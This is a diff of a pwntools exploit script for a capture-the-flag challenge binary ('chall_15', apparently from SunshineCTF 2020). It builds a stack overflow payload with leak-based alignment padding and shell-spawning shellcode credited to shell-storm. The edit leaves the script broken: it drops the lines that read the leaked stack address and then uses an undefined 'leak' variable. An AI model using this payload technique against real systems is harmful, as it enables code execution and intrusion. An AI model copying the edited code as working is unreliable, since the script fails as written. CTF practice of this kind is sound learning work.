@@ -2,16 +2,11 @@ from pwn import *
 
 binary = context.binary = ELF('./chall_15')
 
-if not args.REMOTE:
-    p = process(binary.path)
-else:
-    p = remote('chal.2020.sunshinectf.org', 30015)
+p = process('./chall_15')
+p.recv()
 
 p.sendline()
-p.recvuntil('There\'s a place where nothing seems: ')
-_ = p.recvline().strip()
-stack = int(_,16)
-log.info('stack: ' + hex(stack))
+stack = int(leak,16)
 
 # http://shell-storm.org/shellcode/files/shellcode-905.php
 shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
@@ -25,7 +20,6 @@ payload += p32(0xfacade)
 payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'
 
 stack += len(payload)
-log.info('stack: ' + hex(stack))
 
 payload += shellcode
 payload += (0x4e - len(payload) - 0xc) * b'C'
